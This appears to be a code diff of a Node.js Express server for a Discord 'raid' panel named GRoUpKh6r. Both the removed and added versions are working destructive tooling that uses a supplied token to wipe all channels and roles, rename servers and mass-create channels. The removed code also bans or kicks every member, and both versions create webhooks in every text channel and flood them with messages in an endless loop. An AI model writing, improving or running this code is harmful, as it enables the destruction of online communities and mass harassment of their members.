@@ -1,165 +1,124 @@
 // language: JavaScript, file: server.js, target: Node.js
 const express = require('express');
-const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
-const fetch = require('node-fetch');
+const axios = require('axios');
+const path = require('path');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
-const activeSpammers = new Map();
+const DISCORD_API = 'https://discord.com/api/v10';
 
-async function getClient(token, isBot) {
-    const client = new Client({
-        intents: [
-            GatewayIntentBits.Guilds,
-            GatewayIntentBits.GuildMembers,
-            GatewayIntentBits.GuildMessages,
-            GatewayIntentBits.MessageContent
-        ]
-    });
-    const fullToken = isBot ? `Bot ${token}` : token;
-    await client.login(fullToken).catch(() => {});
-    return client;
-}
+const getHeaders = (token) => ({
+    'Authorization': token.startsWith('Bot ') || token.length > 60 ? token : `Bot ${token}`,
+    'Content-Type': 'application/json',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+});
 
-app.post('/api/execute', async (req, res) => {
-    let { token, isBot, guildId, action, data } = req.body;
-    if (!token || !guildId || !action) return res.status(400).json({ error: 'Missing parameters' });
-
-    let client;
+// Server rename
+app.post('/api/guild/rename', async (req, res) => {
+    const { token, guildId, name } = req.body;
     try {
-        client = await getClient(token, isBot);
-        const guild = await client.guilds.fetch(guildId).catch(() => null);
-        if (!guild) {
-            client.destroy();
-            return res.status(404).json({ error: 'Guild not found or invalid token/perms' });
-        }
-
-        switch (action) {
-            case 'create_channels': {
-                const count = data.count || 10;
-                const name = data.name || 'vanta-raid';
-                const promises = [];
-                for (let i = 0; i < count; i++) {
-                    promises.push(guild.channels.create({ name: name }).catch(() => {}));
-                }
-                await Promise.all(promises);
-                break;
-            }
-            case 'create_roles': {
-                const count = data.count || 10;
-                const name = data.name || 'GRoUpKh6r';
-                const promises = [];
-                for (let i = 0; i < count; i++) {
-                    promises.push(guild.roles.create({ name: name }).catch(() => {}));
-                }
-                await Promise.all(promises);
-                break;
-            }
-            case 'edit_channels': {
-                const newName = data.name || 'vanta-ed';
-                const channels = await guild.channels.fetch();
-                const promises = channels.map(c => c ? c.setName(newName).catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'edit_roles': {
-                const newName = data.name || 'GRoUpKh6r-Role';
-                const roles = await guild.roles.fetch();
-                const promises = roles.map(r => r.id !== guild.id ? r.setName(newName).catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'delete_channels': {
-                const channels = await guild.channels.fetch();
-                const promises = channels.map(c => c ? c.delete().catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'delete_roles': {
-                const roles = await guild.roles.fetch();
-                const promises = roles.map(r => r.id !== guild.id && r.editable ? r.delete().catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'edit_server': {
-                await guild.setName(data.name || 'GRoUpKh6r').catch(() => {});
-                break;
-            }
-            case 'edit_members': {
-                const members = await guild.members.fetch();
-                const newName = data.name || 'GRoUpKh6r Member';
-                const promises = members.map(m => m.manageable ? m.setNickname(newName).catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'ban_all': {
-                const members = await guild.members.fetch();
-                const promises = members.map(m => m.bannable ? m.ban().catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'kick_all': {
-                const members = await guild.members.fetch();
-                const promises = members.map(m => m.kickable ? m.kick().catch(() => {}) : null);
-                await Promise.all(promises);
-                break;
-            }
-            case 'webhook_spam_start': {
-                const channels = await guild.channels.fetch();
-                const textChannels = channels.filter(c => c && c.type === 0);
-                const webhooks = [];
-                
-                for (let [id, channel] of textChannels) {
-                    try {
-                        let wh = await channel.createWebhook({ name: data.webhookName || 'GRoUpKh6r Spammer' });
-                        webhooks.push(wh.url);
-                    } catch (e) {}
-                }
-
-                const spamKey = `${guildId}_${Date.now()}`;
-                const interval = setInterval(async () => {
-                    for (let url of webhooks) {
-                        fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: data.message || '@everyone https://youtu.be/BdXFz8ESpLc' })
-                        }).catch(() => {});
-                    }
-                }, 50); // أسرع تكرار ممكن
-
-                activeSpammers.set(spamKey, interval);
-                client.destroy();
-                return res.json({ success: true, message: 'Webhooks created and spam started infinitely!', spamKey });
-            }
-            case 'webhook_spam_stop': {
-                if (data.spamKey && activeSpammers.has(data.spamKey)) {
-                    clearInterval(activeSpammers.get(data.spamKey));
-                    activeSpammers.delete(data.spamKey);
-                } else {
-                    // إيقاف الكل لهذا السيرفر
-                    for (let [k, v] of activeSpammers.entries()) {
-                        if (k.startsWith(guildId)) {
-                            clearInterval(v);
-                            activeSpammers.delete(k);
-                        }
-                    }
-                }
-                break;
-            }
-            default:
-                client.destroy();
-                return res.status(400).json({ error: 'Unknown action' });
-        }
-
-        client.destroy();
-        return res.json({ success: true, message: 'Operation executed successfully.' });
-    } catch (err) {
-        if (client) client.destroy();
-        return res.status(500).json({ error: err.message });
+        await axios.patch(`${DISCORD_API}/guilds/${guildId}`, { name }, { headers: getHeaders(token) });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[7bl] GRoUpKh6r Panel running on port ${PORT}`));
+// Delete channels and roles
+app.post('/api/guild/purge', async (req, res) => {
+    const { token, guildId } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const [channelsRes, rolesRes] = await Promise.all([
+            axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers }),
+            axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers })
+        ]);
+
+        const deletePromises = [
+            ...channelsRes.data.map(c => axios.delete(`${DISCORD_API}/channels/${c.id}`, { headers }).catch(() => {})),
+            ...rolesRes.data.filter(r => r.name !== '@everyone').map(r => axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { headers }).catch(() => {}))
+        ];
+
+        await Promise.allSettled(deletePromises);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+// Create channels without numbering suffixes
+app.post('/api/guild/create-channels', async (req, res) => {
+    const { token, guildId, name, count } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const promises = [];
+        for (let i = 0; i < count; i++) {
+            promises.push(
+                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
+                    name: name,
+                    type: 0
+                }, { headers }).catch(() => {})
+            );
+        }
+        await Promise.allSettled(promises);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+// Webhook spam flood
+app.post('/api/guild/webhook-spam', async (req, res) => {
+    const { token, guildId, messageText } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
+        const textChannels = channelsRes.data.filter(c => c.type === 0);
+
+        // Create webhooks in all text channels concurrently
+        const webhookPromises = textChannels.map(async (channel) => {
+            try {
+                const whRes = await axios.post(`${DISCORD_API}/channels/${channel.id}/webhooks`, {
+                    name: 'GRoUpKh6r-Spam'
+                }, { headers });
+                return whRes.data;
+            } catch {
+                return null;
+            }
+        });
+
+        const webhooks = (await Promise.all(webhookPromises)).filter(Boolean);
+
+        // Continuous high-speed spam execution
+        res.json({ success: true, webhooksCreated: webhooks.length });
+
+        // Fire asynchronous infinite spam flood
+        global.spamActive = true;
+        const spamLoop = async () => {
+            while (global.spamActive) {
+                await Promise.allSettled(webhooks.map(wh => 
+                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, {
+                        content: messageText
+                    }).catch(() => {})
+                ));
+            }
+        };
+        spamLoop();
+
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+app.post('/api/guild/stop-spam', (req, res) => {
+    global.spamActive = false;
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => {
+    console.log(`[+] GRoUpKh6r panel active on port ${PORT}`);
+});
